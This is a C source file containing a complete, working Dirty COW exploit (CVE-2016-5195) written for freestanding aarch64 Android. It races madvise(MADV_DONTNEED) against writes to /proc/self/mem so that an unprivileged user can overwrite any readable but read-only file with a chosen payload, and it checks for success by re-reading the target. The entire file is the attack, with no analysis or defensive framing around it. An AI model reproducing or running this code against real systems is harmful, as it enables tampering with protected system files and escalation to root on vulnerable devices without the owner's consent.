/*
 * Dirty Cow (CVE-2016-5195) two-thread version, freestanding aarch64.
 * Raw clone() threads: one hammers madvise(MADV_DONTNEED), one hammers
 * lseek+write via /proc/self/mem; parent verifies by re-reading target.
 * Diagnostics print first syscall return values.
 *
 * usage: cow3 <payload> <target>
 * Build: aarch64-linux-android23-clang -O2 -nostdlib -static -o cow3 cow3.c
 */
typedef long i64;
typedef unsigned long u64;

#define AT_FDCWD (-100L)
#define O_RDONLY 0L
#define O_RDWR   2L
#define PROT_READ 1L
#define MAP_PRIVATE 2L
#define MAP_ANONYMOUS 32L
#define MADV_DONTNEED 4L
#define PAGE 4096L

#define NR_set_tid_address 96
#define NR_openat    56
#define NR_close     57
#define NR_lseek     62
#define NR_read      63
#define NR_write     64
#define NR_mmap      222
#define NR_madvise   233
#define NR_clone     220
#define NR_sync      81
#define NR_exit      93
#define NR_exit_group 94
#define NR_nanosleep 101

#define CLONE_VM      0x00000100L
#define CLONE_FS      0x00000200L
#define CLONE_FILES   0x00000400L
#define CLONE_SIGHAND 0x00000800L
#define CLONE_THREAD  0x00010000L
#define CLONE_SYSVSEM 0x00040000L
#define THREAD_FLAGS (CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM)

static inline i64 sys1(i64 n, i64 a) {
    register i64 x8 __asm__("x8") = n;
    register i64 x0 __asm__("x0") = a;
    __asm__ volatile("svc #0" : "=r"(x0) : "r"(x8), "0"(x0) : "memory", "cc");
    return x0;
}
static inline i64 sys2(i64 n, i64 a, i64 b) {
    register i64 x8 __asm__("x8") = n;
    register i64 x0 __asm__("x0") = a;
    register i64 x1 __asm__("x1") = b;
    __asm__ volatile("svc #0" : "=r"(x0) : "r"(x8), "0"(x0), "r"(x1) : "memory", "cc");
    return x0;
}
static inline i64 sys3(i64 n, i64 a, i64 b, i64 c) {
    register i64 x8 __asm__("x8") = n;
    register i64 x0 __asm__("x0") = a;
    register i64 x1 __asm__("x1") = b;
    register i64 x2 __asm__("x2") = c;
    __asm__ volatile("svc #0" : "=r"(x0) : "r"(x8), "0"(x0), "r"(x1), "r"(x2) : "memory", "cc");
    return x0;
}
static inline i64 sys4(i64 n, i64 a, i64 b, i64 c, i64 d) {
    register i64 x8 __asm__("x8") = n;
    register i64 x0 __asm__("x0") = a;
    register i64 x1 __asm__("x1") = b;
    register i64 x2 __asm__("x2") = c;
    register i64 x3 __asm__("x3") = d;
    __asm__ volatile("svc #0" : "=r"(x0) : "r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3) : "memory", "cc");
    return x0;
}
static inline i64 sys6(i64 n, i64 a, i64 b, i64 c, i64 d, i64 e, i64 f) {
    register i64 x8 __asm__("x8") = n;
    register i64 x0 __asm__("x0") = a;
    register i64 x1 __asm__("x1") = b;
    register i64 x2 __asm__("x2") = c;
    register i64 x3 __asm__("x3") = d;
    register i64 x4 __asm__("x4") = e;
    register i64 x5 __asm__("x5") = f;
    __asm__ volatile("svc #0" : "=r"(x0) : "r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5) : "memory", "cc");
    return x0;
}

static inline i64 sys0(i64 n) {
    register i64 x8 __asm__("x8") = n;
    i64 ret;
    __asm__ volatile("svc #0" : "=r"(ret) : "r"(x8) : "memory", "cc");
    return ret;
}

static i64 xopen(const char *p, i64 fl) { return sys4(NR_openat, AT_FDCWD, (i64)p, fl, 0L); }

static void puts_(const char *s, i64 fd) { i64 n=0; while (s[n]) n++; sys3(NR_write, fd, (i64)s, n); }
static void putx_(i64 v, i64 fd) {
    char b[19]; int i = 18; b[i--] = '\n';
    if (v == 0) b[i--] = '0';
    while (v != 0) { int d = (int)(v & 15); b[i--] = d < 10 ? '0'+d : 'a'+d-10; v >>= 4; }
    sys3(NR_write, fd, (i64)(b + i + 1), 18 - i);
}
static int memeq(const char *a, const char *b, i64 n) {
    for (i64 i = 0; i < n; i++) if (a[i] != b[i]) return 0;
    return 1;
}

/* shared state */
static volatile int g_run = 1;
static i64 g_fmem;
static i64 g_map;
static char g_buf[PAGE];
static i64 g_plen;

static void thread_madvise(void) {
    while (g_run) sys3(NR_madvise, g_map, PAGE, MADV_DONTNEED);
    sys1(NR_exit, 0);
}
static void thread_write(void) {
    i64 first_w = 0;
    while (g_run) {
        sys3(NR_lseek, g_fmem, g_map, 0L);
        i64 w = sys3(NR_write, g_fmem, (i64)g_buf, g_plen);
        if (!first_w) { first_w = w; putx_((u64)w, 2); }
    }
    sys1(NR_exit, 0);
}

__attribute__((naked)) void _start(void) {
    __asm__ volatile(
        "mov x0, sp\n"
        "b mymain\n");
}

static char CHK[PAGE];

long mymain(i64 *sp) {
    i64 argc = sp[0];
    char **argv = (char **)(sp + 1);
    if (argc < 3) { puts_("usage: cow3 <payload> <target>\n", 2); sys1(NR_exit_group, 2); }
    const char *payload_path = argv[1];
    const char *target_path = argv[2];

    g_plen = 0;
    i64 fp = xopen(payload_path, O_RDONLY);
    i64 ft = xopen(target_path, O_RDONLY);
    if (fp < 0 || ft < 0) { puts_("ERR open\n", 2); sys1(NR_exit_group, 1); }
    for (;;) {
        i64 r = sys3(NR_read, fp, (i64)(g_buf + g_plen), PAGE - g_plen);
        if (r <= 0) break;
        g_plen += r;
        if (g_plen >= PAGE) break;
    }
    sys1(NR_close, fp);

    i64 tsize = sys3(NR_lseek, ft, 0L, 2L /*SEEK_END*/);
    sys3(NR_lseek, ft, 0L, 0L /*SEEK_SET*/);
    if (tsize < g_plen) { puts_("ERR: payload bigger than target\n", 2); sys1(NR_exit_group, 1); }

    i64 map = sys6(NR_mmap, 0L, PAGE, PROT_READ, MAP_PRIVATE, ft, 0L);
    if (map < 0 && map > -4096L) { puts_("ERR mmap\n", 2); sys1(NR_exit_group, 1); }
    g_map = map;

    g_fmem = xopen("/proc/self/mem", O_RDWR);
    if (g_fmem < 0) { puts_("ERR /proc/self/mem\n", 2); sys1(NR_exit_group, 1); }

    puts_("map=", 2); putx_((u64)map, 2);

    /* spawn two threads via raw clone: child gets fresh stacks */
    i64 s1 = sys6(NR_mmap, 0L, 65536L, 3L /*RW*/, MAP_PRIVATE|MAP_ANONYMOUS, -1L, 0L);
    i64 s2 = sys6(NR_mmap, 0L, 65536L, 3L, MAP_PRIVATE|MAP_ANONYMOUS, -1L, 0L);
    if (s1 < 0 || s2 < 0) { puts_("ERR stack\n", 2); sys1(NR_exit_group, 1); }

    i64 c1 = sys2(NR_clone, THREAD_FLAGS, s1 + 65536L - 16L);
    if (c1 == 0) thread_madvise();              /* child 1 */
    i64 c2 = 0;
    if (c1 > 0) {
        c2 = sys2(NR_clone, THREAD_FLAGS, s2 + 65536L - 16L);
        if (c2 == 0) thread_write();            /* child 2 */
    }
    if (c1 < 0 || c2 < 0) { puts_("ERR clone\n", 2); sys1(NR_exit_group, 1); }

    /* parent verifies */
    for (i64 iter = 0; iter < 30000; iter++) {
        i64 g = xopen(target_path, O_RDONLY);
        if (g >= 0) {
            i64 r = sys3(NR_read, g, (i64)CHK, g_plen);
            sys1(NR_close, g);
            if (r == g_plen && memeq(CHK, g_buf, g_plen)) {
                g_run = 0;
                sys0(NR_sync);
                puts_("COW-OK\n", 1);
                sys1(NR_exit_group, 0);
            }
        }
        struct { i64 s, ns; } ts = {0, 20000000};
        sys2(NR_nanosleep, (i64)&ts, 0L);
    }
    g_run = 0;
    puts_("COW-FAIL\n", 2);
    sys1(NR_exit_group, 1);
    return 0;
}
